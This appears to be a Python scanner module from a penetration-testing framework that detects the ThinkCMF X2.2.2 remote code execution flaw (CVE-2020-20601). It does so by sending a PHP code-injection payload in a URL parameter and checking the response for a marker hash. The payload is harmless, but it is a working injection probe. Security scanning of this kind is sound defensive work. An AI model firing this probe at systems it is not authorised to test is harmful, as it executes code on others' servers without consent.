#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkCMF X2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ThinkCMF X2.2.2 - Remote Code Execution Detection',
        'description': 'ThinkCMF X2.2.2 and below contain a remote code execution caused by processing crafted packets, letting attackers execute arbitrary code remotely, exploit requires sending malicious packets.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'thinkcmf', 'rce', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.shuzhiduo.com/A/l1dygr36Je/',
            'https://blog.riskivy.com/thinkcmf-%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e/',
        ],
        'cve': 'CVE-2020-20601',
    }

    def run(self):
        r = self.http_request(method="GET", path="/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('d9b2c63a497e2f30c4ad9ad083a00691',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="ThinkCMF X2.2.2 - Remote Code Execution detected",
                path="/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');",
            )
            return True
        return False

